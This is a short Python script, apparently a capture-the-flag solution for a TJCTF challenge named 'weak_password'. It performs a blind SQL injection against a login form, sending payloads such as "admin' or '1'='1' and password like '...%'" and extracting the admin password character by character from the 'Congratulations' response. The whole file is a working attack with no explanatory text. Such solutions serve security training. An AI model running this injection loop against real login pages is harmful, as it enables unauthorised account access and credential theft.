#!/usr/bin/env python3

import requests
from string import ascii_lowercase

url = "https://weak_password.tjctf.org/"

username = "admin"

known_pass = ""
while 1:
    for c in ascii_lowercase:
        print("trying .. " + known_pass + c)
        password = "admin' or '1'='1' and password like '{}%".format(
            known_pass + c)

        print('SELECT username, password FROM `userandpassword` WHERE username=\'{}\' AND password=\'{}\''.format(
            username, password))

        data = {
            "username": username,
            "password": password
        }
        response = requests.post(url + 'login', data=data)

        # print(response.text)
        if("Congratulations" in response.text):
            known_pass = known_pass + c
            break
